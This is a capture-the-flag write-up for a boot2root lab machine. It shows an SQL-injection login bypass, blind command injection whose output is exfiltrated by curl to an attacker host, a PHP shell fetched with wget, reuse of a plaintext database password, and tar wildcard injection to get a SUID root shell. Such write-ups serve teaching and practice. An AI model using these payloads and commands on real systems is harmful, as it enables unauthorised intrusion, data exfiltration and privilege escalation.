## BattleX CTF: machine2 
#### Category: Boot2Root
#### Score: 110
#### Number of Solves: 5 [First Blood 🩸] 
#### Machine name
### Description

> Ready to go

###  TL; DR

Exploit command injection to password reuse to wildcard injection on sudo tar to gain root access

### Recon

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-29 21:47 WAT
Nmap scan report for 10.10.27.9
Host is up (0.63s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Big Hacking Book Store

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 21.00 seconds
```

### Exploring

![Imgur](https://i.imgur.com/vxHYIir.png)

_front page_

Nothing much in the source code, just links to a login page and register page that didn't exist

![Imgur](https://i.imgur.com/7AYjkla.png)

_Login page_

Since there was no registration page and I didn't want to fuss with files or directories, I tried a basic SQL injection to bypass the login page, and it worked.

```
Username: '--
Password: '
```
Login page bypassed and greeted by a ping system in /pingsystem.php .

![Imgur](https://i.imgur.com/lsA4hKP.png)

This will likely be vulnerable to command injection, I just have to find a way to trigger the command injection. 

![Imgur](https://i.imgur.com/tz2d93t.png)

My form data was 

```
127.0.0.1; sleep 5
```

After several trials of several techniques of chaining commands, I found the one that works. 

```
127.0.0.1 `sleep 5`
```

The result didn't show, but the delay was sure executed by the system and I concluded it was vulnerable to blind command injection.

### Exploiting 

I proceeded to host a http server to get a result from my blind command injection. That way, it will be possible for me to get an insight of what's going on.

With some Python scripting and tweaking, I got an insight of the directory structure, current user and id

```
127.0.0.1 `curl -X POST -H "Content-Type: text/plain" -d "$(ls -lah)"  http://MY_IP:8080/`
127.0.0.1 `curl -X POST -H "Content-Type: text/plain" -d "$(pwd)"  http://MY_IP:8080/`
127.0.0.1 `curl -X POST -H "Content-Type: text/plain" -d "$(whoami)"  http://MY_IP:8080/`
127.0.0.1 `curl -X POST -H "Content-Type: text/plain" -d "$(id)"  http://MY_IP:8080/`
127.0.0.1 `curl -X POST -H "Content-Type: text/plain" -d "$(wget -O images/exploit.php http://MY_IP:8090/ex.php)" http://MY_IP:8080/`
```

![own](https://i.imgur.com/bBqJg6t.png)

I let the server wget my php shell to the /images folder since I can write there (I tried with the current directory and it didn't work)

![Imgur](https://i.imgur.com/TIWTlQX.png)

With my netcat listening. I got shell

![Imgur](https://i.imgur.com/ZHlh9ck.png)

### Escalating privileges

```
www-data@BattleX:/var/www/html$ cat db.php
cat db.php
<?php
// db.php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$servername = "localhost";
$username = "hacksparo";
$password = "hacksparoisthebest123";
$dbname = "books";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
?>
```

There's a credential in the db.php. It is totally possible for this credential to be used for an actual user in the system. 

```
www-data@BattleX:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[snip]
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
[snip]
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
hacksparo:x:1000:1000:,,,:/home/hacksparo:/bin/bash
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
```
Sure, there's a user hacksparo in the system. I upgraded my shell to a python spawned one so I can try out the credentials.

![Imgur](https://i.imgur.com/1sGZp3s.png)

I am user hacksparo, time to get flag. 

```
hacksparo@BattleX:~$ cat user.txt
cat user.txt
BattleX{a3d9b7d4d5d6d4c3b2a1e9f8d7c6b5a4}
```
User flag: `BattleX{a3d9b7d4d5d6d4c3b2a1e9f8d7c6b5a4}` 

### Getting root access

```
hacksparo@BattleX:~$ sudo -l
sudo -l
Matching Defaults entries for hacksparo on BattleX:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hacksparo may run the following commands on BattleX:
    (ALL) NOPASSWD: /bin/bash /opt/backup/backup.sh
```

With `sudo -l`, I can get if hacksparo can run sudo generally or only on one or two commands, sure enough, hacksparo can only run this specific command `sudo /bin/bash /opt/backup/backup.sh` on the machine. 

```
hacksparo@BattleX:~$ cat /opt/backup/backup.sh
#this is a test

sudo tar -cf backup.tar *
```
I can't alter the file to change its content but I can only run the script. `tar` can be exploited to gain access. The exploit is known as wildcard injection. The process I took was this 

```bash
echo 'cp /bin/bash /home/hacksparo/bash; chmod +s /home/hacksparo/bash' > /home/hacksparo/shell.sh    
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
Running that and running `sudo /bin/bash /opt/backup/backup.sh` will copy bash from /bin/ directory to my current direcotry and set suid bit to it. 

```
hacksparo@BattleX:~$ echo 'cp /bin/bash /home/hacksparo/bash; chmod +s /home/hacksparo/bash' > /home/hacksparo/shell.sh
hacksparo@BattleX:~$ echo "" > "--checkpoint-action=exec=sh shell.sh"
hacksparo@BattleX:~$ echo "" > --checkpoint=1
hacksparo@BattleX:~$ ls
'--checkpoint=1'  '--checkpoint-action=exec=sh shell.sh'   shell.sh   user.txt
```

![Imgur](https://i.imgur.com/39rdvXd.png)

success, now I can run `./bash -p` and get root access

![Imgur](https://i.imgur.com/Ti6Q0M6.png)

```
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
BattleX{2f9e8d7c6b5a4d3c2b1a0f9e8d7c6b5a}
```
Root flag: `BattleX{2f9e8d7c6b5a4d3c2b1a0f9e8d7c6b5a}`

![Not bad meme](https://media1.tenor.com/m/pK9Gkdmh-mAAAAAC/notbad-soccer.gif)
Not bad.